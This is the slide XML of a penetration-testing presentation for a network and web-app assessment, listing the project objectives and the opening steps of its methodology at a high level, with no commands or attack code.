                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>network &amp; web-app assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9052560" y="5394960"/>
            <a:ext cx="2926080" cy="274320"/>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Prepared by</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9052560" y="5669280"/>
            <a:ext cx="2926080" cy="68580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Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mohammed Hany</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mamdouh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9052560" y="6309360"/>
            <a:ext cx="2926080" cy="27432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Penetration Tester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01 · INTRODUCTION</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Project Objective</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="5394960" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Discover the target on the network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Identify the full attack surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Enumerate exposed services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Assess the security of the custom web application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Validate suspected vulnerabilities before trusting them</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Obtain controlled initial access where possible</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Perform systematic post-exploitation enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Assess privilege-escalation opportunities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Collect and preserve evidence at every stage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1100"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Produce a professional, evidence-backed security assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="1554480"/>
            <a:ext cx="5394960" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1600"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="1783080"/>
            <a:ext cx="484632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METHODOLOGY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2194560"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2194560"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2194560"/>
            <a:ext cx="365760" cy="347472"/>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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2194560"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="2496312"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2660904"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2660904"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2660904"/>
            <a:ext cx="365760" cy="347472"/>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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2660904"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="2962656"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3127248"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3127248"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3127248"/>
            <a:ext cx="365760" cy="347472"/>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3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3127248"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerability Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3429000"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3593592"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3593592"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3593592"/>
            <a:ext cx="365760" cy="347472"/>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4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3593592"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3895344"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4059936"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4059936"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
